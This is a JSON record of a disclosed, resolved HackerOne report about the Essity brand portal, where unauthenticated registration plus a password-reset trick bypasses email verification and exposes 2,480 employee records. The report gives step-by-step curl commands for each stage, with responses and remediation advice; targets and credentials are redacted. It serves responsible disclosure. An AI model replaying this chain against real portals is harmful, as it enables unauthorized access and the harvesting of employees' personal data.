@@ -1,0 +1,119 @@
+{
+  "id": 3737516,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM3NTE2",
+  "url": "https://hackerone.com/reports/3737516",
+  "title": "Unauthenticated Account Registration + Email Verification Bypass + PII Data Leak (2,480 Records) on ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-15T08:51:58.286Z",
+  "submitted_at": "2026-05-15T08:51:59.394Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-27T13:51:54.000Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-05-26T14:26:33.537Z",
+  "team_member_agreed_on_going_public_at": "2026-05-27T13:51:53.445Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe ████████ portal at `████████` (intended only for authorized Essity employees and partners) has a multi-step vulnerability chain that allows any unauthenticated attacker to:\n\n1. Register an account via the public ████████ API\n2. Bypass email verification by exploiting the password reset flow on the pending account\n3. Login successfully with an \"active\" account\n4. Access protected API endpoints that leak **2,480 employee records** (names, emails, profile URLs)\n\nThis bypasses both the SAML SSO requirement and the email verification gate.\n\n## Attack Chain (Fully Automated PoC)\n\n### Step 1: Register Account (No Auth Required)\n\n```bash\n# Get CSRF token from unauthenticated Blitz endpoint\nCSRF=$(curl -sk https://████████/actions/blitz/csrf/json)\nTOKEN=$(echo \"$CSRF\" | python3 -c \"import sys,json;print(json.load(sys.stdin)['token'])\")\n\n# Register arbitrary user\ncurl -sk -X POST '████████' \\\n  -H 'Accept: application/json' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data-urlencode \"CRAFT_CSRF_TOKEN=${TOKEN}\" \\\n  --data-urlencode 'email=████████' \\\n  --data-urlencode 'password=████████' \\\n  --data-urlencode 'firstName=Test' \\\n  --data-urlencode 'lastName=User'\n```\n\n**Response:** `{\"success\":true,\"id\":████████}`\n\n### Step 2: Request Password Reset for Pending Account\n\n```bash\ncurl -sk -X POST 'https://████████/actions/users/send-password-reset-email' \\\n  -H 'Accept: application/json' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data-urlencode \"CRAFT_CSRF_TOKEN=${TOKEN}\" \\\n  --data-urlencode 'loginName=████████'\n```\n\n**Response:** `{\"success\":true}`\n\nThe reset email is sent even though the account is in \"pending verification\" state.\n\n### Step 3: Use Reset Code to Activate Account\n\nThe reset email contains: `████████`\n\n```bash\ncurl -sk -X POST 'https://████████/actions/users/set-password' \\\n  -H 'Accept: application/json' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data-urlencode \"CRAFT_CSRF_TOKEN=${TOKEN}\" \\\n  --data-urlencode 'code=████████' \\\n  --data-urlencode 'id=████████' \\\n  --data-urlencode 'newPassword=████████' \\\n  --data-urlencode 'confirmPassword=████████'\n```\n\n**Response:** `{\"success\":true,\"status\":\"active\"}`\n\nThe account status changes from \"pending\" to **\"active\"**, completely bypassing email verification.\n\n### Step 4: Login\n\n```bash\ncurl -sk -X POST 'https://████████/actions/users/login' \\\n  -H 'Accept: application/json' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data-urlencode \"CRAFT_CSRF_TOKEN=${TOKEN}\" \\\n  --data-urlencode 'loginName=████████' \\\n  --data-urlencode 'password=████████'\n```\n\n**Response:** `{\"success\":true,\"returnUrl\":\"https://████████/\"}`\n\n### Step 5: Access PII Data\n\n```bash\ncurl -sk -b <session_cookie> 'https://████████/api/people-finder.json'\n```\n\n**Response:** 562KB JSON with **2,480 employee records** containing:\n- Employee IDs\n- Full names\n- Email addresses ████████\n- Profile page URLs\n- Job titles (where populated)\n\nSee ████████ people_finder_full_extract.json\n\n## Verified Evidence\n\n| Evidence | Status |\n|----------|--------|\n| Account creation (ID ████████) | CONFIRMED |\n| Password reset on pending account | CONFIRMED (email received) |\n| Account activation via set-password | CONFIRMED (status: active) |\n| Login success | CONFIRMED (returnUrl + session cookie) |\n| people-finder.json data leak (2,480 records) | CONFIRMED (562KB response) |\n| Session info shows authenticated user | CONFIRMED (isGuest: false, id: ████████) |\n\n## Test Account\n\n| Field | Value |\n|-------|-------|\n| Email | ████████ |\n| Password | ████████ |\n| User ID | ████████ |\n| UUID | ████████ |\n| Status | Active (pending admin approval for full portal, but API accessible) |\n\n## Affected Endpoints\n\n| Endpoint | Auth Required | Behavior |\n|----------|---------------|----------|\n| POST /actions/████████ | None | Creates user accounts |\n| POST /actions/users/send-password-reset-email | None | Works for pending accounts |\n| POST /actions/users/set-password | None + valid code | Activates pending accounts |\n| POST /actions/users/login | None | Returns authenticated session |\n| GET /api/people-finder.json | Session (no approval) | Returns 2,480 PII records |\n| GET /asset-library/manage-collections | Session (no approval) | Returns collections HTML |\n| GET /actions/blitz/csrf/json | None | Provides CSRF tokens |\n\n## Impact\n\n## Impact\n\n| Impact | Description |\n|--------|-------------|\n| **PII Data Breach** | 2,480 employee records exposed (names, corporate emails, profile URLs) |\n| **Access Control Bypass** | SAML SSO requirement completely bypassed via direct API registration |\n| **Email Verification Bypass** | Password reset flow activates accounts without email confirmation |\n| **Spear Phishing Enabler** | Leaked employee directory enables targeted social engineering |\n| **Brand Asset Exposure** | Authenticated access to collections management (████████ guidelines, assets) |\n\n## Remediation\n\n1. **Disable public user registration** or restrict to allowlisted email domains ████████\n2. **Do not send password reset emails to unverified accounts** (Craft CMS should check `pending` status before sending)\n3. **Enforce admin-approval gate on ALL authenticated endpoints**, not just the portal views. The `/api/people-finder.json` endpoint must check group permissions.\n4. **Remove Blitz CSRF endpoint** from public access or add rate limiting\n5. **Add CAPTCHA** to registration and password reset flows\n6. **Audit all API endpoints** for missing authorization checks on non-approved users",
+  "weakness": {
+    "id": 184,
+    "name": "Authentication Bypass by Primary Weakness"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "qbit_",
+    "frijolsec",
+    "dpaysm",
+    "2026",
+    "matty69v",
+    "abdulsomedsadat",
+    "sottam"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 991946,
+    "asset_type": "URL",
+    "asset_identifier": "https://brand.tena.com",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
